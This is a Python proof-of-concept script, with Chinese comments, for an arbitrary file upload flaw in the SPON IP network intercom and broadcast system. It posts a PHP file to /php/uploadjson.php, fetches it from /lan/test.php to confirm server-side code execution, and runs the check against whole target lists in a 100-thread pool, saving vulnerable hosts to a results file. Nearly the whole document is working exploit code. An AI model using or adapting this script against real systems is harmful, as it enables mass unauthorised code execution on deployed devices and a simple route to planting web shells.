#世邦通信 SPON IP网络对讲广播系统 uploadjson.php 任意文件上传漏洞

import argparse,requests,sys,time,re
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
GREEN = '\033[92m' #输出颜色
RESET = '\033[0m'
def banner():
    text = '''

 
███████╗██╗██╗     ███████╗    ██╗   ██╗██████╗ ██╗      █████╗  ██████╗ ██████╗ 
██╔════╝██║██║     ██╔════╝    ██║   ██║██╔══██╗██║     ██╔══██╗██╔═══██╗██╔══██╗
█████╗  ██║██║     █████╗      ██║   ██║██████╔╝██║     ███████║██║   ██║██║  ██║
██╔══╝  ██║██║     ██╔══╝      ██║   ██║██╔═══╝ ██║     ██╔══██║██║   ██║██║  ██║
██║     ██║███████╗███████╗    ╚██████╔╝██║     ███████╗██║  ██║╚██████╔╝██████╔╝
╚═╝     ╚═╝╚══════╝╚══════╝     ╚═════╝ ╚═╝     ╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═════╝                                                ░                                ░        
                                                                version:SPON_IP_fileupload 1.0
                                                                Author: hi6
'''
    print(text)
def main():
    banner()
    #设置参数
    parser = argparse.ArgumentParser(description="世邦通信 SPON IP网络对讲广播系统 uploadjson.php 任意文件上传漏洞")
    parser.add_argument('-u','--url',dest='url',type=str,help="input your url")
    parser.add_argument('-f','--file',dest='file',type=str,help='input file path')
    args = parser.parse_args()
    #处理资产，添加线程
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open('url.txt','r',encoding='utf-8')as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h") 

def poc(target):
    url_payload = '/php/uploadjson.php'
    url = target + url_payload
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Maxthon/4.4.3.4000 Chrome/30.0.1599.101 Safari/537.36", 
        "Content-Type": "application/x-www-form-urlencoded", 
        "Accept-Encoding": "gzip, deflate, br", 
        "Connection": "keep-alive"
        }
    data = {"jsondata[filename]": "test.php", "jsondata[data]": "<?php echo 8888;unlink(__FILE__);?>"}
    proxies = {
        'http':'http://127.0.0.1:8080',
        'https':'http://127.0.0.1:8080'
    }
    
    try:
        response = requests.post(url=url,headers=headers,data=data,timeout=5,verify=False)
        payload2 = "/lan/test.php" #上传成功要访问的上传文件路径
        url2 = target + payload2
        response2 = requests.get(url=url2,headers=headers,proxies=proxies)
        # print(response2.headers)
        # print(response.text)
        if response.status_code == 200 and "8888" in response2.text:
            print( f"{GREEN}[+] {target} 存在文件上传漏洞！\n  {url2} {RESET}")
            with open('result.txt','a',encoding='utf-8')as f:
                f.write(target + '\n')
                return True
        else:
            print("[-] 不存在漏洞！！")
    except Exception:
        pass


        
if __name__ == '__main__':
    main()
